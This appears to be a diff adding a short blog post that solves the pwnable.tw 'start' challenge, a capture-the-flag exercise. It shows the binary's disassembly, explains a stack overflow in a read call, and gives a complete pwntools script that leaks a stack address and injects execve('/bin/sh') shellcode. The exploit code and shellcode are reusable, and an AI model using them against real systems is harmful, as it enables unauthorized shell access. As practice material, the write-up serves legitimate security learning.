@@ -1,0 +1,59 @@
+---
+layout: post
+title:  "start"
+date:   2018-08-03
+categories:  pwnable.tw
+---
+```assembly
+push    ':FTC'
+push    ' eht'
+push    ' tra'
+push    'ts s'
+push    2774654Ch
+mov     ecx, esp        ; addr
+mov     dl, 14h         ; len
+mov     bl, 1           ; fd
+mov     al, 4
+int     80h             ; LINUX - sys_write
+xor     ebx, ebx
+mov     dl, 3Ch
+mov     al, 3
+int     80h             ; LINUX -
+add     esp, 14h
+retn
+```
+
+write 14h and then read 3ch   <- overflow
+
+
+
+1.overflow to write, leak $esp and stack address
+
+2.add shellcode
+
+
+
+```python
+from pwn import *
+#context.log_level = "debug"
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+
+#p = process("./start")
+p = remote("chall.pwnable.tw","10000")
+
+#gdb.attach(p)
+p.recvuntil("CTF:")
+p.send("A" * 20 + p32(0x8048087))
+a = u32(p.recv()[:4])
+#print a
+log.info("Address = "+ hex(a))
+log.info("Next = " + p32(a+20))
+p.send("A" * 20 + p32(a+20) + shellcode)
+p.interactive()
+```
+
+
+
+##### pay attention to send and sendline  
+
